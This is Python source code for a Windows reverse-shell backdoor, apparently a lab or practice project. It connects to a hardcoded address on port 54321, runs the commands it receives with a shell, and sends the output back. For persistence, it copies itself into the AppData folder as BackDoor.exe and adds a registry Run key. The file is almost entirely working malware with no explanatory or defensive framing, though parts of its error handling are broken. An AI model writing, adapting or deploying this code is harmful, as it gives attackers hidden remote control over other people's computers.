#!/usr/bin/python3

import socket
import subprocess
import time
import os
import shutil
import sys

def Connection():
    while True:
     time.sleep(20)
     try:
         s.connect(("192.168.226.130", 54321))
         shell()
     except:
         Connection()
def shell():
    while True:
            message = s.recv(1024).decode('utf-8')
            if message.strip().lower() == "q":
                break
            elif message[:2] =="cd" and len(message) > 1:
                try:
                    os.chdir(message[3:])
                    s.send(str(os.getcwd()).encode())
                except:
                    error_message = f"Error changing directory: {e}"
                    s.send(error_message.encode())
            else:
                try:
                    proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = proc.stdout.read() + proc.stderr.read()
                    s.send(result)
                except Exception as e:
                    error_message = f"Error executing command: {e}"
                    s.send(error_message.encode())


location = os.environ["appdata"] + "\\BackDoor.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Connection()
s.close()
